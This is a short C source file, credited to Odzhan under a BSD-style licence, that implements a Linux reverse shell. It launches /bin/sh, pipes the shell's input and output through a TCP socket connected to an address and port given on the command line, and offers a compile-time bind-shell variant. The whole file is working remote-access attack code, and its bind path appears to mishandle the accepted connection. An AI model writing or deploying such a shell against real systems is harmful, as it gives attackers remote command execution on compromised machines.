/**
  Copyright © 2017 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <signal.h>
#include <sys/epoll.h>

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

void main(int argc, char *argv[])
{
    struct sockaddr_in sa;
    int                i, r, w, s, len, efd, evt; 
    int                pid, fd, in[2], out[2];
    char               buf[BUFSIZ];
    struct epoll_event evts;

    // create pipes for redirection of stdin/stdout/stderr
    pipe(in);
    pipe(out);

    // execute /bin/sh as child process
    pid = fork();
    
    if (pid==0) 
    {
      // assign read end to stdin
      dup2(in[0], STDIN_FILENO);
      // assign write end to stdout   
      dup2(out[1], STDOUT_FILENO);
      // assign write end to stderr  
      dup2(out[1], STDERR_FILENO);  
      
      close(in[0]);
      close(in[1]);
      
      close(out[0]);
      close(out[1]);
      
      execve("/bin/sh", 0, 0);
    } else {      
      close(in[0]);  // close read end
      close(out[1]); // close write end
      
      // create a socket
      s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
      
      sa.sin_family      = AF_INET;
      sa.sin_port        = htons(atoi(argv[2]));
      sa.sin_addr.s_addr = inet_addr(argv[1]);

      #ifndef BIND
        // attempt connection to remote host
        connect(s, (struct sockaddr*)&sa, sizeof(sa));
      #else
        bind(s, (struct sockaddr*)&sa, sizeof(sa));
        listen(s, 0);
        r = accept(s, 0, 0);
      #endif
      
      efd = epoll_create1(0);
 
      // add 2 descriptors to monitor
      // level triggered
      for (i=0; i<2; i++) {
        fd = (i==0) ? s : out[0];
        evts.data.fd = fd;
        evts.events  = EPOLLIN;
        
        epoll_ctl(efd, EPOLL_CTL_ADD, fd, &evts);
      }
          
      // now loop until user exits or some other error
      for (;;)
      {
        r = epoll_wait(efd, &evts, 1, -1);
                  
        // error? bail out           
        if (r <= 0) {
          break;
        }
         
        evt = evts.events;
        fd  = evts.data.fd;
        
        // not input? bail out
        if (!(evt & EPOLLIN)) break;

        // default is to read from stdout
        r = out[0];
        w = s;
        
        // if socket, read that instead
        if (fd==s) {
          r = s;
          w = in[1];
        }
        // read from socket or stdout        
        len=read(r, buf, BUFSIZ);
        // write to socket or stdin        
        write(w, buf, len);        
      }      
      // remove 2 descriptors 
      for (i=0; i<2; i++) {
        fd = (i==0) ? s : out[0];
        epoll_ctl(efd, EPOLL_CTL_DEL, fd, NULL);
      }                  
      close(efd);
      // shutdown socket
      shutdown(s, SHUT_RDWR);
      close(s);
      // terminate parent      
      kill(pid, SIGCHLD);            
    }
    close(in[1]);
    close(out[0]);
    exit(0);    
}
    
